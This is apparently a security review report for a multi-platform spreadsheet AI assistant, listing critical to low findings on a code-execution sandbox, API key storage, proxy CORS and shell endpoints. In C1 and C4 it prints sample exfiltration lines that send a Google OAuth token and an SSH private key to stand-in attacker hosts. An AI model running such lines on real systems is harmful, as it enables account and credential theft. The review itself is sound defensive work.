# Security Review Report — claude-office-plugin

**Reviewed:** 2025-03-10  
**Scope:** Multi-platform spreadsheet AI assistant (API keys, Claude API, code execution)  
**Files reviewed:** ApiKeyPanel, claudeClient, googleSheetsAdapter, AllInOne.gs, platformDetect, deploy-gsheets, proxy-server, sandbox-executor

---

## Executive Summary

| Severity | Count |
|----------|-------|
| **CRITICAL** | 4 |
| **HIGH** | 5 |
| **MEDIUM** | 5 |
| **LOW** | 3 |

**Risk Level:** 🔴 **HIGH** — Multiple critical issues must be addressed before production use, especially for the Google Sheets add-on with user-provided API keys and code execution.

---

## CRITICAL Issues (Fix Immediately)

### C1. GAS `new Function()` sandbox is not a sandbox — arbitrary GAS API access

**Severity:** CRITICAL  
**Category:** Insecure Code Execution / Broken Sandbox  
**Location:** `google-addon/AllInOne.gs:465-383`

**Issue:**  
The `runInSandbox_` function uses `new Function()` to execute user/LLM-generated code. In JavaScript, functions created via `new Function()` run with access to the global object. The executed code can:

1. Access `globalThis.ScriptApp`, `globalThis.PropertiesService`, `globalThis.DriveApp`, `globalThis.CacheService`, `globalThis.GmailApp`, etc.
2. Call `globalThis.ScriptApp.getOAuthToken()` to steal the user’s Google OAuth token
3. Use `globalThis.eval()` or `globalThis.Function` to run arbitrary code
4. Use the provided `UrlFetchApp` to exfiltrate data

**Example payload:**
```javascript
return globalThis.ScriptApp.getOAuthToken();
// or: UrlFetchApp.fetch('https://attacker.com/steal?t='+ScriptApp.getOAuthToken());
```

**Impact:** Full compromise of the user’s Google account, spreadsheet data, and OAuth scope.

**Remediation:**
- Do not treat `new Function()` as a security boundary. In GAS there is no strong process-level sandbox; any executed JS code has full GAS API access.
- Options:
  1. **Restrict capabilities:** Only execute code that has passed a strict allowlist (e.g. specific patterns like `sheet.getRange(...).getValues()`), or run via a separate, locked-down service.
  2. **User consent:** Clearly warn that running code has full access to the spreadsheet and related services.
  3. **Audit:** Log all executions and affected ranges for security review.
- Document that this is “trusted code execution” (user/LLM-generated), not sandboxed.

---

### C2. API key stored in `localStorage` — XSS leads to key theft

**Severity:** CRITICAL  
**Category:** Sensitive Data Exposure / XSS  
**Location:** `src/components/ApiKeyPanel.tsx:21-22`, `src/api/claudeClient.ts:221`

**Issue:**  
The Anthropic API key is stored in `localStorage` under `claude-office-api-key`. Any XSS on the same origin can read it via `localStorage.getItem('claude-office-api-key')`.

**Impact:**  
- XSS in React components, third-party scripts, or markdown rendering (e.g. `dangerouslySetInnerHTML`) can steal the API key.
- Even without classic XSS, browser extensions and certain same-origin bugs can read `localStorage`.

**Remediation:**
1. Prefer server-side storage: store keys in GAS `PropertiesService` (ScriptProperties) and only pass a reference or proxy token to the client.
2. If client-side storage is required:
   - Use `sessionStorage` instead of `localStorage` so keys are cleared when the tab closes.
   - Consider the Web Crypto API for encrypting keys at rest, with a user-provided passphrase (higher complexity).
3. Add Content-Security-Policy and minimize inline scripts.
4. Review all places that render user content (chat, markdown, code blocks) for XSS.

---

### C3. Proxy CORS allows any origin — localhost proxy exposed to the web

**Severity:** CRITICAL  
**Category:** Broken Access Control / CORS Misconfiguration  
**Location:** `proxy-server.js:886-902`

**Issue:**  
```javascript
res.setHeader('Access-Control-Allow-Origin', origin);  // origin from request, or '*'
// ...
cors({ origin(origin, cb) { cb(null, true); } });  // allows ANY origin
```

Any website can send `Origin: https://evil.com` and the proxy reflects it. With `Access-Control-Allow-Credentials: true`, a malicious site can make authenticated requests to `http://127.0.0.1:3001` if the user has the proxy running.

**Impact:**  
- Code execution endpoints (`/execute-python`, `/execute-shell`, `/execute-code`) can be triggered by any site.
- Chat and other sensitive endpoints can be called without user interaction.

**Remediation:**
```javascript
const ALLOWED_ORIGINS = [
  'http://127.0.0.1:3001', 'http://localhost:3001',
  'http://127.0.0.1:5173', 'http://localhost:5173',
  'https://docs.google.com',  // for Google Sheets embedding
];
app.use(cors({
  origin(origin, cb) {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
    cb(null, false);
  },
  credentials: true,
}));
```

Apply the same logic to the manual `Access-Control-Allow-Origin` header (or remove it and rely on the cors middleware).

---

### C4. Proxy `/execute-python` and `/execute-shell` lack proper input validation

**Severity:** CRITICAL  
**Category:** Command Injection / Arbitrary Code Execution  
**Location:** `proxy-server.js:2414-2486`

**Issues:**

1. **`/execute-python`**  
   - User code is written to a temp file and executed with `spawn(PYTHON_CMD, [tmpFile])`.  
   - Full `process.env` is passed; secrets in the environment can be read by the script.  
   - No validation similar to `lib/sandbox-executor.js` (e.g. `BLOCKED_PATTERNS`).  
   - No isolated `HOME`/`TMPDIR`; the script has normal filesystem access.

2. **`/execute-shell`**  
   - Uses `exec(command, ...)`, which invokes a shell.  
   - Only the first word is checked against `SHELL_DENY_LIST`.  
   - Commands like `curl http://evil.com/$(cat ~/.ssh/id_rsa)` are allowed.  
   - `exec` with string commands is inherently prone to injection.

3. **`/preview-html`**  
   - Uses `exec(\`open "${filePath}"\`)`, which is fragile and can be abused if `filePath` ever includes user input or special characters.

**Impact:**  
- Arbitrary Python code execution with full environment access.  
- Arbitrary shell command execution.  
- Data exfiltration and system compromise on the machine running the proxy.

**Remediation:**
1. **Python:** Reuse or mirror `lib/sandbox-executor.js` logic: `validateCode()` with blocklists, custom sandbox directory, isolated env (e.g. `HOME`, `TMPDIR`), and output limits.
2. **Shell:** Prefer `execFile` with an argument array and avoid passing user input through a shell. If shell use is required, restrict to a very limited, allowlisted command set.
3. **Preview:** Use `spawn('open', [filePath], { stdio: 'ignore' })` instead of `exec()` with string interpolation.

---

## HIGH Issues (Fix Before Production)

### H1. API key prefix (`keyPrefix`) returned to client in `chatDirect`

**Severity:** HIGH  
**Category:** Information Disclosure  
**Location:** `google-addon/AllInOne.gs:247, 251, 254, 270, 280, 284`

**Issue:**  
`chatDirect` returns `_dbg: { keyPrefix: apiKey.substring(0, 12), ... }` in both error and success responses. The React sidebar uses `chatFromReact`, which does not return `_dbg`, but `chatDirect` is still a top-level GAS function and can be called via `google.script.run.chatDirect(...)`.

**Impact:**  
- If any client code calls `chatDirect`, the first 12 characters of the API key are exposed. For `sk-ant-api03-...`, this reveals the key type and a portion of the secret.  
- Useful for brute-force or validation attacks.

**Remediation:**
- Remove `_dbg` from all responses that can reach the client.  
- If needed for server-side debugging, ensure it never leaves the server (e.g. only used in server logs, not in the response body).

---

### H2. `platformDetect.ts` — URL parameter can override platform

**Severity:** HIGH  
**Category:** Security Misconfiguration / Potential Bypass  
**Location:** `src/api/platformDetect.ts:20-24`

**Issue:**  
```typescript
const params = new URLSearchParams(window.location.search);
const explicit = params.get("platform");
if (explicit && isValidPlatform(explicit)) {
  return explicit as Platform;
}
```

An attacker controlling `?platform=wps-et` (or another value in the list) can change platform detection. This can change which adapter and backend are used (e.g. proxy vs GAS, different auth paths).

**Impact:**  
- Possible auth or routing bypass if platform-specific checks assume a fixed platform.
- Confusion between WPS vs Google Sheets behavior and endpoints.

**Remediation:**
- Remove URL parameter override in production, or restrict it to debug builds only.
- If kept, require explicit opt-in (e.g. a debug flag or query parameter that is clearly documented and disabled by default).

---

### H3. No origin validation for proxy `/chat` and execution endpoints

**Severity:** HIGH  
**Category:** Broken Access Control  
**Location:** `proxy-server.js` (CORS and endpoint handlers)

**Issue:**  
Endpoints like `/chat`, `/execute-code`, `/execute-python`, `/execute-shell` do not validate `Origin` or `Referer` beyond CORS. The CORS middleware currently accepts any origin.

**Impact:**  
- Malicious sites can call these endpoints when the user has the proxy running, leading to unauthorized chat usage and code execution.

**Remediation:**
- Enforce strict origin validation as in C3.
- Optionally add per-endpoint checks (e.g. `Referer` for `/chat` and execution routes) for defense in depth.

---

### H4. `deploy-gsheets.mjs` reads `.clasp.json` including `scriptId`

**Severity:** HIGH (context-dependent)  
**Category:** Information Disclosure / Deployment  
**Location:** `deploy-gsheets.mjs:44-46`

**Issue:**  
The script reads `google-addon/.clasp.json` and uses `scriptId`. If deployment is run in CI or shared environments, this file (and thus `scriptId`) can leak. `scriptId` identifies the GAS project.

**Impact:**  
- Indirect reconnaissance and potential abuse if combined with other weaknesses.  
- Risk of accidental commit of `.clasp.json` to version control.

**Remediation:**
- Add `.clasp.json` to `.gitignore` if not already.
- Prefer environment variables (e.g. `CLASP_SCRIPT_ID`) for CI, and avoid committing secrets.
- Document secure handling of `scriptId` in deployment docs.

---

### H5. Error messages may expose internal details

**Severity:** HIGH  
**Category:** Information Disclosure  
**Location:** `claudeClient.ts:366`, `AllInOne.gs:251, 254, 342`

**Issue:**  
- `xhr.responseText` is passed to the user on proxy errors.  
- GAS returns raw API error snippets (`errBody.substring(0, 200)`).  
- Stack traces or internal paths could be exposed if errors are logged or surfaced to the client.

**Impact:**  
- Leak of API structure, error formats, or other implementation details.  
- In some cases, portions of responses (e.g. rate-limit messages) could aid attackers.

**Remediation:**
- Sanitize error messages shown to users (no raw `responseText`, no stack traces).
- Log full errors server-side only; return generic messages to the client.
- Avoid including `keyPrefix` or any key material in error responses.

---

## MEDIUM Issues (Fix When Possible)

### M1. Proxy `/execute-python` inherits full `process.env`

**Severity:** MEDIUM  
**Category:** Information Disclosure  
**Location:** `proxy-server.js:2423`

**Issue:**  
Python subprocesses receive `env: { ...process.env }`, so they can read all environment variables (API keys, `PATH`, tokens, etc.).

**Remediation:**  
Use a minimal, allowlisted env (e.g. `PATH`, `LANG`, `HOME`/`TMPDIR` set to a sandbox dir) and avoid passing secrets.

---

### M2. `exec()` used for `/preview-html` instead of `spawn()`

**Severity:** MEDIUM  
**Category:** Command Injection (potential)  
**Location:** `proxy-server.js:2485`

**Issue:**  
`exec(\`open "${filePath}"\`)` is unsafe if `filePath` ever includes quotes or special characters. Current usage with a generated path is lower risk, but the pattern is brittle.

**Remediation:**  
Use `spawn('open', [filePath], { stdio: 'ignore' })` and ensure `filePath` is always derived from trusted, generated values.

---

### M3. No rate limiting on proxy endpoints

**Severity:** MEDIUM  
**Category:** Denial of Service / Abuse  
**Location:** `proxy-server.js` (most endpoints)

**Issue:**  
`/chat` has concurrency and interval limits, but `/execute-python`, `/execute-shell`, `/execute-code`, and other endpoints lack rate limiting. A client (or malicious site via CORS) could spam these endpoints.

**Remediation:**  
Add per-IP or per-session rate limits for execution and heavy endpoints (e.g. `express-rate-limit`).

---

### M4. `google.script.run` exposes all top-level functions

**Severity:** MEDIUM  
**Category:** Excessive Permissions  
**Location:** `google-addon/AllInOne.gs`

**Issue:**  
In GAS, any top-level function can be invoked via `google.script.run.functionName()`. The sidebar uses specific functions, but `debugDiagnose`, `debugDiagnose2`, `debugDiagnose3`, `authorizeAll`, etc. are also exposed.

**Remediation:**  
- Remove or guard debug helpers in production.  
- Use a single dispatcher (e.g. `handleRequest({action, params})`) so the client only calls one entry point and you explicitly route to allowed actions.

---

### M5. `getSheetData` error message includes unsanitized `sheetName`

**Severity:** MEDIUM (low exploitability)  
**Category:** Potential XSS / Injection  
**Location:** `google-addon/AllInOne.gs:124`

**Issue:**  
`return { error: 'Sheet "' + sheetName + '" not found' }` embeds `sheetName` in the error. If `sheetName` is ever rendered as HTML, it could be XSS.

**Remediation:**  
- Validate/sanitize `sheetName` (e.g. alphanumeric + limited chars).  
- Ensure the client never renders this string with `dangerouslySetInnerHTML`; use `textContent` or a safe templating approach.

---

## LOW Issues (Consider Fixing)

### L1. `ALLOWED_ORIGINS` defined but not used

**Severity:** LOW  
**Location:** `proxy-server.js:878-885`

`ALLOWED_ORIGINS` is defined but CORS is configured to accept any origin. Wire CORS to this list as described in C3.

---

### L2. `hasKey` validation allows non-standard keys

**Severity:** LOW  
**Location:** `src/components/ApiKeyPanel.tsx:36`

`hasKey = key.trim().length > 10` accepts any string longer than 10 characters. For `sk-ant-api03-...` keys, consider validating the prefix or format before saving.

---

### L3. `platformDetect` accepts wide range of platforms from URL

**Severity:** LOW  
**Location:** `src/api/platformDetect.ts:40`

`isValidPlatform` includes multiple platforms; together with the URL override (H2), this increases the risk of misrouting. Restrict URL-based overrides or scope them to development only.

---

## Security Checklist

| Check | Status |
|-------|--------|
| No hardcoded secrets | ✅ |
| API key not in source | ✅ |
| Input validation before code execution | ❌ (proxy), ⚠️ (GAS sandbox insufficient) |
| SQL/NoSQL injection prevention | N/A (no direct DB) |
| XSS prevention | ⚠️ (localStorage + potential rendering) |
| CSRF protection | ⚠️ (CORS too permissive) |
| Authentication required | ⚠️ (proxy has none; GAS uses user context) |
| Authorization verified | ⚠️ (GAS depends on add-on install) |
| Rate limiting | ⚠️ (partial) |
| HTTPS enforced | ⚠️ (proxy uses HTTP on localhost) |
| Security headers | ❌ (CSP not observed) |
| Dependencies audited | Not verified in this review |
| Error messages sanitized | ❌ |
| Logging free of secrets | ⚠️ (`keyPrefix` in responses) |

---

## `anthropic-dangerous-direct-browser-access` Context

The project does **not** use `anthropic-dangerous-direct-browser-access: true`. API calls go through:

1. **Proxy:** Proxy server calls Anthropic (no browser → Anthropic).  
2. **GAS:** `UrlFetchApp` in GAS calls Anthropic. The key is sent from the client to GAS via `google.script.run`, then from GAS to Anthropic — the browser never talks directly to Anthropic with the key.

So the “direct browser” risk from that header does not apply. The main risks are key storage in `localStorage`, CORS on the proxy, and code execution in GAS and the proxy.

---

## Recommendations Summary

1. **Immediate:** Stop using `new Function()` as a security boundary in GAS. Treat executed code as fully trusted and document this; consider restricting execution or moving to a safer model.
2. **Immediate:** Move API key storage off `localStorage` or mitigate XSS and same-origin exposure.
3. **Immediate:** Restrict CORS on the proxy to a fixed allowlist (localhost, docs.google.com, etc.).
4. **Immediate:** Harden `/execute-python` and `/execute-shell` (use `lib/sandbox-executor.js` patterns for Python; avoid shell invocation for user-controlled commands).
5. **Soon:** Remove `_dbg` and `keyPrefix` from client-visible responses.
6. **Soon:** Remove or tightly restrict the `platform` URL override in production.
7. **Ongoing:** Add rate limiting, sanitize errors, and ensure `.clasp.json` and other deployment secrets are not committed or exposed.
